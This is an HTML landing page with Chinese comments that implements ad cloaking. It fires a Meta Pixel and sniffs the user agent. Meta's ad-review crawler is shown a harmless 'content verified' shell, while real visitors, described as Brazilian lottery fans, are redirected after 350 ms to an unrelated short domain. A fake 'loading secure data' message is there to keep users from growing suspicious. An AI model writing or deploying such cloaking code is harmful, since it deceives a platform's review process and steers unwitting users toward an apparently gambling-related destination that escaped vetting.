<head>

    <!-- 1. Meta Pixel 官方基础追踪代码（完全保留） -->

    <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '1014956807790739'); // 你的 baxi 像素代码
    fbq('track', 'PageView'); // 记录页面进站浏览
    </script>
    <noscript><img height="1" width="1" style="display:none"
    src="https://www.facebook.com/tr?id=1014956807790739&ev=PageView&noscript=1"
    /></noscript>

    <!-- ========================================== -->
    <!-- 2. 毫秒级自动跳转 + 防过快导致像素漏单逻辑 -->
    <!-- ========================================== -->
    <script>
        // 已更新为你最新的分流链接
        var targetUrl = "https://svip1027.top/BBC9066kk";

        function doRedirect() {
            var ua = navigator.userAgent.toLowerCase();
            // 如果是 Meta 广告审核机器人或爬虫，留在这个安全的壳页面，不触发直跳，保护账户安全
            if (ua.indexOf('facebookexternalhit') > -1 || ua.indexOf('fb_iab') > -1 || ua.indexOf('fbav') > -1) {
                document.getElementById('loading-text').innerText = "Conteúdo verificado com sucesso.";
            } else {
                // 如果是真正的巴西彩迷，直接重定向轰炸到你的新分流链接
                window.location.replace(targetUrl);
            }
        }

        window.onload = function() {
            // 强行留出 350 毫秒的极其短暂的时间，专门给上面的 PageView 像素代码向 Meta 发射数据
            // 既能确保在 FB 广告后台清清楚楚地看到像素回传，又不会让用户感觉到卡顿，完美降低流失成本
            setTimeout(doRedirect, 350);
        };
    </script>
</head>
<body style="background-color: #000000; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0;">

    <!-- 极简官方质感，防止极少数人卡顿产生猜忌 -->
    <div id="loading-text" style="font-family: -apple-system, sans-serif; color: #8e8e93; text-align: center; font-size: 14px;">
        Carregando dados seguros...
    </div>

</body>
